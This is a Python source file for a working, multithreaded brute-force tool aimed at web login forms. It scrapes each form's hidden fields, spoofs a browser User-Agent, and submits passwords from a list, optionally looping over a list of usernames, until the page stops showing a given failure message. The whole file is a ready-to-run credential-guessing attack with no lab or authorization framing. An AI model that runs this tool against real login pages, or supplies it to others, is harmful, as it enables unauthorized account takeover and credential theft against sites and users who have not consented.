from bs4 import BeautifulSoup
import requests,threading
import time
from classes import ThreadSafeCounter
# from classes import ThreadSafeQueue



def threadTarget(URL,username,passwords,start,end,event,counter,username_field_name,password_field_name,failure_message):
    print(start)
    for i in range(start,end):
        if(event.is_set()):
            break
        response=requestSender(URL=URL,username=username,password=passwords[i],username_field_name=username_field_name,password_field_name=password_field_name,failure_message=failure_message)
        counter.increment()
        if(response=="success"):
            # print(f"{threading.current_thread().name}: username : {username} , password :{ passwords[i]} request number {counter.get_count()}")
            # messagebox.showerror(title="success",message=f"username : {username} \n password : {passwords[i]}")
            event.set()
            threading.current_thread().setName(passwords[i])
            break   
            
        else:
            print(threading.current_thread().name+ f" : login failed request number {counter.get_count()} ")
    
    
        
    

def requestSender(URL,username,password,username_field_name,password_field_name,failure_message):
    head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
    }
    session = requests.session()
    page=session.get(URL)
    parsedpage=BeautifulSoup(page.text,'html.parser')
    c=page.cookies                                     
    params=getRequestParameters(parsedpage=parsedpage)
    params[username_field_name]=username; params[password_field_name]=password
    if(parsedpage.select("form")[0].get("method")=="post"):
        response=session.post(URL,data=params,cookies=c,headers=head)
    else:
        response=session.get(URL,params=params,cookies=c,headers=head)
    # parsedResponse=BeautifulSoup(response.text,"html.parser")

    if(failure_message in response.text):
        return "failed"
    else:
        return "success"
    

# def sessionInit(URL):
#     session = requests.session()
#     page=session.get(URL)
#     parsedpage=BeautifulSoup(page.text,'html.parser')
#     c=page.cookies
#     params=getRequestParameters(parsedpage=parsedpage)
#     return params,c,session,parsedpage.select("title")[0].text

# def postRequestSender(URL,params,cookies,session):
#     head = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
#     }
#     return session.post(URL,data=params,cookies=cookies,headers=head)

# def BF_function(URL,username,passwords,start,end):
#     params,cookies,session,title=sessionInit(URL=URL)
#     for i in range(start,end):
#         params["username"]=username; params["password"]=passwords[i]
#         response=postRequestSender(URL=URL,params=params,session=session,cookies=cookies)
#         parsedResponse=BeautifulSoup(response.text,"html.parser")
#         print(parsedResponse)
#         if(title!=parsedResponse.select('title')[0].text):
#             print("username : "+username+" password : "+passwords[i])
#             break
#         else:
#             print("login failed")

def getRequestParameters(parsedpage):
    inputs=parsedpage.select("input")
    parameters={}
    for input in inputs:
        if(input.get("value")!=None):
            parameters[input.get("name")]=input.get("value")
    return parameters


def main(passwords,URL,username,num_of_threads,username_field_name,password_field_name,failure_message):

    

    
    passwordsCountPerThread=int(passwords.__len__()/num_of_threads)
    threads=[]
    counter=ThreadSafeCounter()
    Success=threading.Event()
    Success.clear()


    print(time.localtime())
    for i in range(0,num_of_threads):
        start=i*passwordsCountPerThread
        if(i==num_of_threads-1): end=passwords.__len__()
        else : end=(i+1)*passwordsCountPerThread
        threads.append(threading.Thread(target=threadTarget,args=(URL,username,passwords,start,end,Success,counter,username_field_name,password_field_name,failure_message),name="thread "+str(i)))
    
    startTime=time.time_ns()
   
    for thread in threads:
        thread.start()

    found_password=None
    
    for i in range(0,num_of_threads):
        threads[i].join()
        if(threads[i].name!="thread "+str(i)): found_password=threads[i].name        

    print(f"consumed time {(time.time_ns()-startTime)/1_000_000_000.0} sec")


    print(time.localtime())
    
    return found_password

def username_and_password_main(username_field_name,password_field_name,usernames_list_path,passwords,URL,num_of_threads,failure_message):
    usernames=open(usernames_list_path,"r",encoding="utf-8").read().splitlines()
   
    for i in range(0,passwords.__len__(),1000):
        for j in range(0,usernames.__len__()):
            found_password=try_username(passwords=passwords,URL=URL,username=usernames[j],num_of_threads=num_of_threads,username_field_name=username_field_name,password_field_name=password_field_name,start=i,end=(i+1000)if(i+1000<passwords.__len__())else passwords.__len__(),failure_message=failure_message)
            if(found_password!=None): return f"username : {usernames[j]} , password : {found_password}"

    


def try_username(passwords,URL,username,num_of_threads,username_field_name,password_field_name,start,end,failure_message):

    passwordsCountPerThread=int((end-start+1)/num_of_threads)
    threads=[]
    counter=ThreadSafeCounter()
    Success=threading.Event()
    Success.clear()

    for i in range(0,num_of_threads):
        thread_start=i*passwordsCountPerThread+start
        if(i==num_of_threads-1): thread_end=end
        else : thread_end=(i+1)*passwordsCountPerThread+start
        threads.append(threading.Thread(target=threadTarget,args=(URL,username,passwords,thread_start,thread_end,Success,counter,username_field_name,password_field_name,failure_message),name="thread "+str(i)))
    
    
   
    for thread in threads:
        thread.start()

    found_password=None
    
    for i in range(0,num_of_threads):
        threads[i].join()
        if(threads[i].name!="thread "+str(i)): found_password=threads[i].name        

    return found_password
